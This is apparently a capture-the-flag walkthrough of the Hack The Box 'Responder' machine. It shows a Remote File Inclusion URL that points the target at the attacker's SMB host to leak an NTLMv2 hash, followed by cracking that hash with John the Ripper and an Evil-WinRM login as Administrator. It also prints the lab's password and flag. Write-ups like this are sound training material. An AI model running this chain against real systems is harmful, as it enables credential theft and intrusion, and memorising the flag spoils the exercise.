Responder

Overview Link to heading

Responder is a machine from the Starting Point path on Hack The Box. It is designed to practice fundamental concepts of service enumeration, Remote File Inclusion (RFI) exploitation, NTLMv2 authentication capture, and remote access through WinRM.

The objective is to identify the exposed services, analyze the web application, exploit a remote file inclusion to trigger an SMB authentication attempt, capture the NTLMv2 hash using Responder, recover the password through cracking, and use the credentials to access the system through Evil-WinRM.

Enumeration Link to heading

We begin by performing a full port scan with Nmap:

sudo nmap -sC -sV -p- --open --min-rate 5000 -sS -Pn -T5 <TARGET_IP>

The result shows two exposed services:

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

The identified operating system is Windows.

Port 80/tcp is running an Apache server with PHP, while port 5985/tcp corresponds to WinRM, a remote management protocol used by Windows systems.

To properly access the website through the domain used by the machine, we configure /etc/hosts:

sudo nano /etc/hosts

We add:

<TARGET_IP> unika.htb

This allows us to access the website through:

http://unika.htb

Web Enumeration Link to heading

While analyzing the application, we find a page parameter used to load content:

http://unika.htb/index.php?page=

This behavior is interesting because the parameter allows an external location to be specified.

When a web application allows files to be loaded from a location controlled by the user, a vulnerability known as Remote File Inclusion (RFI) may occur.

RFI (Remote File Inclusion) is a vulnerability in which an application allows resources located on a remote server controlled by an attacker to be included or requested.

In this case, the application processes the page parameter, so we can investigate what happens when we provide it with a remote location.

RFI Exploitation Link to heading

To understand the exploitation, it is important to know the concept of UNC.

UNC (Universal Naming Convention) is a format primarily used in Windows to identify network resources. Its usual structure is:

\\server\resource

For example:

\\10.10.16.125\login

When using a UNC path, Windows may attempt to access the resource through SMB (Server Message Block), a protocol used to share files, printers, and other resources over a network.

In a URL, this path can be represented using:

//10.10.16.125/login

In our case, we use:

http://unika.htb/index.php?page=//10.10.16.125/login

The intention is not to directly retrieve a file from our machine, but to cause the Windows server to attempt a connection to our machine through SMB.

NTLMv2 Authentication Capture Link to heading

To receive the SMB connection, we start Responder on our VPN interface:

Responder is a tool used during security assessments to respond to certain name resolution protocols and network services, potentially triggering or capturing authentication attempts from Windows systems.

In this scenario, Responder acts as an SMB server prepared to receive the connection generated by the application.

When the Windows server attempts to access the remote resource, it starts an authentication process.

This is where NTLMv2 comes into play.

NTLM (NT LAN Manager) is an authentication protocol historically used by Windows systems. NTLMv2 is a more robust version of the protocol that uses a challenge-response mechanism.

In simplified form:

Server
   ↓
Challenge
   ↓
Client
   ↓
NTLMv2 Response
   ↓
Server

The system does not directly send the password. Instead, it generates a response based on the password and the received challenge.

Responder can capture this authentication response.

After making the request to the application:

http://unika.htb/index.php?page=//10.10.16.125/login

Responder captures:

[SMB] NTLMv2-SSP Client   : <TARGET_IP>
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:...

The obtained value corresponds to an NTLMv2 authentication response, not the password in plaintext.

Responder stores this information in its logs:

SMB-NTLMv2-SSP-<TARGET_IP>.txt

Hash Cracking Link to heading

Once the NTLMv2 hash has been obtained, we can attempt to recover the password through a dictionary attack.

For this, we use John the Ripper:

sudo john -w=/usr/share/wordlists/john.lst SMB-NTLMv2-SSP-<TARGET_IP>.txt

John identifies the password associated with the Administrator user:

badminton        (Administrator)

This allows us to obtain the credentials:

Username: Administrator
Password: badminton

It is important to distinguish between capturing and cracking:

Responder
    ↓
Captures the NTLMv2 response
    ↓
John the Ripper
    ↓
Tests passwords from the dictionary
    ↓
Finds the password

Access through WinRM Link to heading

During the initial enumeration, we identified port 5985/tcp.

This port corresponds to WinRM (Windows Remote Management), a service that allows Windows systems to be managed remotely.

We use Evil-WinRM, a tool that allows us to establish a remote session through WinRM:

evil-winrm -i <TARGET_IP> -u administrator -p badminton

The connection is successful:

*Evil-WinRM* PS C:\Users\Administrator\Documents>

We now have a remote PowerShell session on the Windows system.

We enumerate the user directories:

cd C:\Users
dir

We find:

Administrator
mike
Public

The flag is located on the desktop of the mike user:

cd C:\Users\mike\desktop
dir

We obtain:

-a----         3/10/2022   4:50 AM             32 flag.txt

Finally, we display its contents:

type flag.txt

Flag Link to heading

The obtained flag is:

ea81b7afddd03efaa0945333ed147fac

Conclusion Link to heading

Responder presents a scenario based on service enumeration, Remote File Inclusion exploitation, interaction with UNC/SMB resources, NTLMv2 authentication capture, credential cracking, and remote access through WinRM.

The process followed was:

Enumeration
    ↓
Identification of HTTP and WinRM
    ↓
Configuration of unika.htb
    ↓
Identification of the page parameter
    ↓
Identification of RFI
    ↓
Use of a UNC path
    ↓
SMB request to our machine
    ↓
NTLMv2 capture with Responder
    ↓
Cracking of the NTLMv2 response
    ↓
Obtaining Administrator credentials
    ↓
Access through Evil-WinRM
    ↓
User enumeration
    ↓
Access to mike's desktop
    ↓
Flag retrieval

Despite its Very Easy difficulty, the machine allows us to understand how a web vulnerability can be used as a starting point to trigger an SMB authentication and obtain an NTLMv2 response. This information can then be analyzed through cracking techniques to recover the credentials and obtain remote access to the system through WinRM.
